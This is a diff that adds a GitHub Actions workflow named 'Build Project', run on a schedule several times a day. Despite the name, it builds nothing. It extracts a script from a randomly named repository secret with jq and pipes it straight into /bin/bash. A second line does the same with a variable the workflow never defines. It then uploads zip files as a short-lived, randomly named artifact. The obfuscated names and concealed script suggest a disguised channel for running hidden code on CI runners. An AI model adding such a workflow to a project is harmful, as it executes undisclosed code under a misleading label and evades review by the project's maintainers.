@@ -1,0 +1,27 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '40 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          npn9196: ${{ secrets.npn9196 }}
+        run: |
+          printf '%s' "$npn9196" | jq -r .zu4097 | /bin/bash
+          printf '%s' "$fpg42" | jq -r .upa6616 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: sVz5uacW
+          path: "*.zip"
+          retention-days: 1
